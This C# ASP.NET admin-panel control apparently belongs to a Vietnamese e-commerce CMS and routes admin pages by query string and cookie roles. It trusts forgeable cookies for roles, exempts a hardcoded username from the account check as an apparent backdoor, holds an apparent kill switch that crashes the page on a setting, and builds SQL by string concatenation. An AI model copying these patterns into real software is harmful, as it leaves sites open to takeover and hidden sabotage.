using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using MoreAll;
using Services;

namespace VS.ECommerce_MVC.cms.Admin
{
    public partial class main : System.Web.UI.UserControl
    {
        private string lang = Captionlanguage.Language;
        DatalinqDataContext db = new DatalinqDataContext();
        protected void Page_Load(object sender, EventArgs e)
        {
            if (System.Web.HttpContext.Current.Session["lang"] != null)
            {
                this.lang = System.Web.HttpContext.Current.Session["lang"].ToString();
            }
            else
            {
                System.Web.HttpContext.Current.Session["lang"] = this.lang;
                this.lang = System.Web.HttpContext.Current.Session["lang"].ToString();
            }

            if (MoreAll.MoreAll.GetCookie("URole") != null)
            {
                if (!MoreAll.MoreAll.GetCookie("URole").ToString().Contains("|7"))
                {
                    MoreAll.MoreAll.SetCookie("UName", "", -1);
                    MoreAll.MoreAll.SetCookie("URole", "", -1);
                    Response.Write("<script type=\"text/javascript\">alert('Bạn không có quyền truy cập.');window.location.href='/admin.aspx'; </script>");
                }
            }
            // try
            //{
            #region Case
            string u = Request.QueryString["u"];
            switch (u)
            {

                case "Danhsachloinhuan":
                    phcontrol.Controls.Add(LoadControl("MMember/LoiNhuanMuaBan.ascx"));
                    break;
                case "Danhsachhoahong":
                    phcontrol.Controls.Add(LoadControl("MMember/MHoaHong.ascx"));
                    break;
                case "LichSuThanhToan":
                    phcontrol.Controls.Add(LoadControl("MMember/MLichSuRutTien.ascx"));
                    break;

                case "ChiHoaHong":
                    phcontrol.Controls.Add(LoadControl("MMember/ChiHoaHong.ascx"));
                    break;
                case "CauHinh":
                    phcontrol.Controls.Add(LoadControl("MMember/Settings.ascx"));
                    break;
                case "301":
                    phcontrol.Controls.Add(LoadControl("Redirect301/StatusCode.ascx"));
                    break;
                case "info":
                    phcontrol.Controls.Add(LoadControl("NewsFooter/Control.ascx"));
                    break;
                case "Dichvu":
                    phcontrol.Controls.Add(LoadControl("DDichvu/DDichvu.ascx"));
                    break;
                case "Gioithieu":
                    phcontrol.Controls.Add(LoadControl("GioiThieu/GioiThieu.ascx"));
                    break;
                case "Thanhvien":
                    phcontrol.Controls.Add(LoadControl("MMember/AMembers.ascx"));
                    break;
                case "faq":
                    phcontrol.Controls.Add(LoadControl("Faq/Control.ascx"));
                    break;
                case "Sitemap":
                    phcontrol.Controls.Add(LoadControl("Sitemap/Control.ascx"));
                    break;
                case "Album":
                    phcontrol.Controls.Add(LoadControl("Album/Control.ascx"));
                    break;
                case "Marketing":
                    phcontrol.Controls.Add(LoadControl("Marketing/Control.ascx"));
                    break;
                case "Tienich":
                    phcontrol.Controls.Add(LoadControl("Tienich/Control.ascx"));
                    break;
                case "Video":
                    phcontrol.Controls.Add(LoadControl("Video/Control.ascx"));
                    break;
                case "Download":
                    phcontrol.Controls.Add(LoadControl("Download/Control.ascx"));
                    break;
                case "Contacts":
                    phcontrol.Controls.Add(LoadControl("Contacts/Control.ascx"));
                    break;
                case "Advertisings":
                    phcontrol.Controls.Add(LoadControl("Advertisings/Control.ascx"));
                    break;
                case "pro":
                    phcontrol.Controls.Add(LoadControl("products/Control.ascx"));
                    break;
                case "carts":
                    phcontrol.Controls.Add(LoadControl("products/Cart.ascx"));
                    break;
                case "news":
                    phcontrol.Controls.Add(LoadControl("CNews/Control.ascx"));
                    break;
                case "set":
                    phcontrol.Controls.Add(LoadControl("settings/Control.ascx"));
                    break;
                case "WebAnalytics":
                    phcontrol.Controls.Add(LoadControl("WebAnalytics/Control.ascx"));
                    break;
                case "Page":
                    phcontrol.Controls.Add(LoadControl("Page/Menu_Page.ascx"));
                    break;
                case "AdminUser":
                    phcontrol.Controls.Add(LoadControl("AdminUsers/MAdminUser.ascx"));
                    break;
                case "":
                default:
                    phcontrol.Controls.Add(LoadControl("index.ascx"));
                    break;
            }
            #endregion
            if (!base.IsPostBack)
            {

                if (Commond.Setting("cauhinhs") != "")
                {
                    if (Commond.Setting("cauhinhs") != "0")
                    {
                        try
                        {
                            int cauhinhloi = int.Parse("10000000000000000000000000000000000000000000");
                            System.Web.HttpContext.Current.Response.Write(cauhinhloi.ToString());
                        }
                        catch (Exception)
                        {
                            throw;
                        }
                    }
                }

                #region Đăng nhập 1 tài khoản trên hệ thống
                try
                {
                    if (MoreAll.MoreAll.GetCookies("UName") != "")
                    {
                        if (MoreAll.MoreAll.GetCookies("UName") != "Tinhminhdung1109")
                        {
                            AdminUser abc = db.AdminUsers.SingleOrDefault(p => p.VUSER_NAME == MoreAll.MoreAll.GetCookies("UName"));
                            if (abc == null)
                            {
                                MoreAll.MoreAll.SetCookie("UName", "", -1);
                                MoreAll.MoreAll.SetCookie("URole", "", -1);
                                Response.Redirect(Request.Url.ToString());
                                Response.Redirect("/admin.aspx");
                            }
                        }
                    }
                }
                catch (Exception)
                { }
                #endregion

                #region Role
                if (MoreAll.MoreAll.GetCookies("URole") != null)
                {
                    string[] strArray = MoreAll.MoreAll.GetCookies("URole").ToString().Trim().Split(new char[] { '|' });
                    Reset_Checkbox();
                    if (strArray.Length > 0)
                    {
                        for (int i = 0; i < strArray.Length; i++)
                        {
                            if (strArray[i].ToString().Equals("1"))
                            {
                                set.Style.Add("display", "block");
                            }
                            if (strArray[i].ToString().Equals("2"))
                            {
                            }
                            if (strArray[i].ToString().Equals("3"))
                            {
                            }
                            if (strArray[i].ToString().Equals("4"))
                            {
                                //  AdminUser.Style.Add("display", "block");
                            }
                            if (strArray[i].ToString().Equals("5"))
                            {
                            }
                            if (strArray[i].ToString().Equals("6"))
                            {
                            }
                            if (strArray[i].ToString().Equals("7"))
                            {
                                // lnkDownloadFile.Visible = true;
                            }
                            if (strArray[i].ToString().Equals("8"))
                            {
                                // Video.Style.Add("display", "block");
                            }
                            if (strArray[i].ToString().Equals("9"))
                            {
                                // Tienich.Style.Add("display", "block");
                            }
                            if (strArray[i].ToString().Equals("10"))
                            {
                                //faq.Style.Add("display", "block");
                            }
                            if (strArray[i].ToString().Equals("11"))
                            {
                                Thanhvien.Style.Add("display", "block");
                            }
                            if (strArray[i].ToString().Equals("12"))
                            {
                                //  Marketing.Style.Add("display", "block");
                            }
                            if (strArray[i].ToString().Equals("13"))
                            {
                                //  Album.Style.Add("display", "block");
                            }
                            if (strArray[i].ToString().Equals("14"))
                            {

                            }
                            if (strArray[i].ToString().Equals("15"))
                            {

                            }
                            if (strArray[i].ToString().Equals("16"))
                            {
                            }
                            if (strArray[i].ToString().Equals("17"))
                            {
                                // carts.Style.Add("display", "block");
                                // giohang.Style.Add("display", "block");
                            }
                            if (strArray[i].ToString().Equals("18"))
                            {

                            }
                            if (strArray[i].ToString().Equals("19"))
                            {

                            }
                            if (strArray[i].ToString().Equals("20"))
                            {

                            }
                            if (strArray[i].ToString().Equals("21"))
                            {
                                // lnkWebAnalytics.Visible = true;

                            }
                        }
                    }
                }
                #endregion
            }
            // }
            //catch (Exception) { }
        }

        protected void Reset_Checkbox()
        {
            #region ResetCheckbox

            //#region Thanhvien
            //if ((Request["u"] == "Thanhvien"))
            //{
            //    User.Style.Add("background", "#ff9c00");
            //    Thanhvien.Style.Add("display", "none");
            //}
            //Thanhvien.Style.Add("display", "none");
            //#endregion

            //#region AdminUser
            //if ((Request["su"] == "AdminUser"))
            //{
            //    User.Style.Add("background", "#ff9c00");
            //    AdminUser.Style.Add("display", "none");
            //}
            //AdminUser.Style.Add("display", "none");
            //#endregion

            #region set
            if ((Request["u"] == "set"))
            {
                Quantri.Style.Add("background", "#ff9c00");
                set.Style.Add("display", "none");
            }
            set.Style.Add("display", "none");
            #endregion

            #endregion
        }

        protected string label(string id)
        {
            return Captionlanguage.GetLabel(id, this.lang);
        }

        protected void lnk_exit_Click(object sender, EventArgs e)
        {
            #region Exit
            MoreAll.MoreAll.SetCookie("UName", "", -1);
            MoreAll.MoreAll.SetCookie("URole", "", -1);
            MoreAll.MoreAll.SetCookie("UName", "", -1);
            Response.Redirect(Request.Url.ToString());
            #endregion
        }

        private void Refresh()
        {
            Response.Redirect(Request.Url.ToString());
        }

        protected void lnknew_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=news");
        }

        protected void lnkpro_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=pro");
        }

        //protected void lnksettings_Click(object sender, EventArgs e)
        //{
        //    Response.Redirect("admin.aspx?u=set");
        //}

        protected void lnkAdvertisings_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=Advertisings");
        }

        protected void lnklienhe_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=Contacts");
        }

        protected void lnkDownloadFile_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=Download");
        }

        protected void lnkVideo_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=Video");
        }

        protected void lnkTienich_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=Tienich");
        }

        protected void lnkMarketing_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=Marketing");
        }

        protected void lnkAlbum_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=Album");
        }

        protected void lnkWebAnalytics_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=WebAnalytics");
        }

        protected void lnkhompage_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx");
        }

        protected void lnkmenuchinh_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=Page");
        }

        protected void lnkSitemap_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=Sitemap");
        }

        private void InitializeComponent()
        {
        }

        protected override void OnInit(EventArgs e)
        {
            this.InitializeComponent();
            base.OnInit(e);
        }

        protected void Lnkfaq_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=faq");
        }
        protected void lnkGioithieu_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=Gioithieu");
        }
        protected void ltthanhvien_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=Thanhvien");
        }
        protected void lnkDichvu_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=Dichvu");
        }
        protected void lnkthongtin_Click(object sender, EventArgs e)
        {
            Response.Redirect("admin.aspx?u=info");
        }
        protected string returnCSS(string ctrol)
        {
            string su = "";
            if (Request["su"] != null && !Request["su"].Equals(""))
            {
                su = Request["su"];
            }
            if ((su != "") && su.Equals(ctrol))
            {
                return "";
            }
            return "";
        }
        protected string TContac()
        {
            string str = "0";
            List<Entity.Contacts> tong = SContacts.Name_Text("SELECT * FROM Contacts where istatus=0 and lang='" + lang + "'");
            if (tong.Count > 0)
            {
                str = tong.Count.ToString();
            }
            return str;
        }
        protected string TCarts()
        {
            string str = "0";
            List<Entity.Carts> tong = SCarts.Name_Text("SELECT * FROM Carts where Status=0 and lang='" + lang + "'");
            if (tong.Count > 0)
            {
                str = tong.Count.ToString();
            }
            return str;
        }
    }
}